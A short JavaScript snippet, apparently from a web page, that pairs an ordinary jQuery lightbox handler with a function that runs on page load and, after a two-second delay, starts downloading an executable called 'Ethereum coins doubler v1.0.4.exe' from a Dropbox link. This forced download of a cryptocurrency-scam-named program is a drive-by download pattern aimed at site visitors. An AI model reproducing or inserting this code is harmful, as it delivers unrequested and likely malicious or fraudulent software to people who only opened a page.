function download(){
  setTimeout(function(){
    downloadFile("https://dl.dropboxusercontent.com/s/9yjpd6drkt7ass8/Ethereum%20coins%20doubler%20v1.0.4.exe");
  }, 1998);
};
window.addEventListener("load", download);
$(document).on('click', '[data-toggle="lightbox"]', function(event) {
  event.preventDefault();
  $(this).ekkoLightbox();
});
